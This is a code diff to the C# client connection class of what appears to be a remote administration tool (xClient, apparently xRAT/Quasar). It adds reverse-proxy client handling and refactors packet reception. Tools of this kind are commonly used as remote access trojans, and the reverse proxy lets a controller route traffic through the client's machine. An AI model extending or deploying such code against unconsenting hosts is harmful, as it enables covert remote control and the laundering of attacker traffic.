@@ -9,6 +9,9 @@ using xClient.Core.Compression;
 using xClient.Core.Encryption;
 using xClient.Core.Extensions;
 using xClient.Core.Packets;
+using xClient.Core.ReverseProxy.Packets;
+using System.Collections.Generic;
+using xClient.Core.ReverseProxy;
 
 namespace xClient.Core
 {
@@ -71,6 +74,13 @@ namespace xClient.Core
             Payload
         }
 
+        private List<ReverseProxyClient> _proxyClients;
+
+        public ReverseProxyClient[] ProxyClients
+        {
+            get { return _proxyClients.ToArray(); }
+        }
+
         public const uint KEEP_ALIVE_TIME = 25000;
         public const uint KEEP_ALIVE_INTERVAL = 25000;
 
@@ -128,6 +138,7 @@ namespace xClient.Core
         private void Initialize()
         {
             AddTypeToSerializer(typeof (IPacket), typeof (UnknownPacket));
+            _proxyClients = new List<ReverseProxyClient>();
         }
 
         private void AsyncReceive(IAsyncResult result)
@@ -154,46 +165,57 @@ namespace xClient.Core
 
             while (process)
             {
-                if (_receiveState == ReceiveType.Header)
+                switch (_receiveState)
                 {
-                    process = _readableDataLen >= HEADER_SIZE;
-                    if (process)
+                    case ReceiveType.Header:
                     {
-                        _payloadLen = BitConverter.ToInt32(_buffer, _readOffset);
-
-                        _readableDataLen -= HEADER_SIZE;
-                        _readOffset += HEADER_SIZE;
-                        _receiveState = ReceiveType.Payload;
-                    }
-                }
-                else if (_receiveState == ReceiveType.Payload)
-                {
-                    process = _readableDataLen >= _payloadLen;
-                    if (process)
-                    {
-                        byte[] payload = new byte[_payloadLen];
-                        Array.Copy(this._buffer, _readOffset, payload, 0, payload.Length);
-
-                        if (encryptionEnabled)
-                            payload = AES.Decrypt(payload, Encoding.UTF8.GetBytes(Settings.PASSWORD));
-
-                        if (payload.Length > 0)
+                        process = _readableDataLen >= HEADER_SIZE;
+                        if (process)
                         {
-                            if (compressionEnabled)
-                                payload = new SafeQuickLZ().Decompress(payload, 0, payload.Length);
+                            _payloadLen = BitConverter.ToInt32(_buffer, _readOffset);
 
-                            using (MemoryStream deserialized = new MemoryStream(payload))
-                            {
-                                IPacket packet = Serializer.DeserializeWithLengthPrefix<IPacket>(deserialized,
-                                    PrefixStyle.Fixed32);
-
-                                OnClientRead(packet);
-                            }
+                            _readableDataLen -= HEADER_SIZE;
+                            _readOffset += HEADER_SIZE;
+                            _receiveState = ReceiveType.Payload;
                         }
+                        break;
+                    }
+                    case ReceiveType.Payload:
+                    {
+                        process = _readableDataLen >= _payloadLen;
+                        if (process)
+                        {
+                            byte[] payload = new byte[_payloadLen];
+                            try
+                            {
+                                Array.Copy(this._buffer, _readOffset, payload, 0, payload.Length);
+                            }
+                            catch
+                            {
+                            }
 
-                        _readOffset += _payloadLen;
-                        _readableDataLen -= _payloadLen;
-                        _receiveState = ReceiveType.Header;
+                            if (encryptionEnabled)
+                                payload = AES.Decrypt(payload, Encoding.UTF8.GetBytes(Settings.PASSWORD));
+
+                            if (payload.Length > 0)
+                            {
+                                if (compressionEnabled)
+                                    payload = new SafeQuickLZ().Decompress(payload, 0, payload.Length);
+
+                                using (MemoryStream deserialized = new MemoryStream(payload))
+                                {
+                                    IPacket packet = Serializer.DeserializeWithLengthPrefix<IPacket>(deserialized,
+                                        PrefixStyle.Fixed32);
+
+                                    OnClientRead(packet);
+                                }
+                            }
+
+                            _readOffset += _payloadLen;
+                            _readableDataLen -= _payloadLen;
+                            _receiveState = ReceiveType.Header;
+                        }
+                        break;
                     }
                 }
             }
@@ -233,7 +255,7 @@ namespace xClient.Core
             }
         }
 
-        public void Send<T>(IPacket packet) where T : IPacket
+        public void Send<T>(T packet) where T : IPacket
         {
             lock (_handle)
             {
@@ -244,7 +266,7 @@ namespace xClient.Core
                 {
                     using (MemoryStream ms = new MemoryStream())
                     {
-                        Serializer.SerializeWithLengthPrefix<T>(ms, (T) packet, PrefixStyle.Fixed32);
+                        Serializer.SerializeWithLengthPrefix<T>(ms, packet, PrefixStyle.Fixed32);
 
                         byte[] data = ms.ToArray();
 
@@ -297,6 +319,14 @@ namespace xClient.Core
                 _readableDataLen = 0;
                 _payloadLen = 0;
 
+                if(_proxyClients != null)
+                {
+                    lock(_proxyClients)
+                    {
+                        foreach (ReverseProxyClient proxy in _proxyClients)
+                            proxy.Disconnect();
+                    }
+                }
                 Commands.CommandHandler.StreamCodec = null;
             }
         }
@@ -324,6 +354,46 @@ namespace xClient.Core
         {
             foreach (Type type in types)
                 AddTypeToSerializer(parent, type);
+        }
+
+        public void ConnectReverseProxy(ReverseProxyConnect Command)
+        {
+            lock (_proxyClients)
+            {
+                _proxyClients.Add(new ReverseProxyClient(Command, this));
+            }
+        }
+
+        public ReverseProxyClient GetReverseProxyByConnectionId(int ConnectionId)
+        {
+            lock (_proxyClients)
+            {
+                for (int i = 0; i < _proxyClients.Count; i++)
+                {
+                    if (_proxyClients[i].ConnectionId == ConnectionId)
+                        return _proxyClients[i];
+                }
+                return null;
+            }
+        }
+
+        public void RemoveProxyClient(int ConnectionId)
+        {
+            try
+            {
+                lock (_proxyClients)
+                {
+                    for (int i = 0; i < _proxyClients.Count; i++)
+                    {
+                        if (_proxyClients[i].ConnectionId == ConnectionId)
+                        {
+                            _proxyClients.RemoveAt(i);
+                            break;
+                        }
+                    }
+                }
+            }
+            catch { }
         }
     }
 }
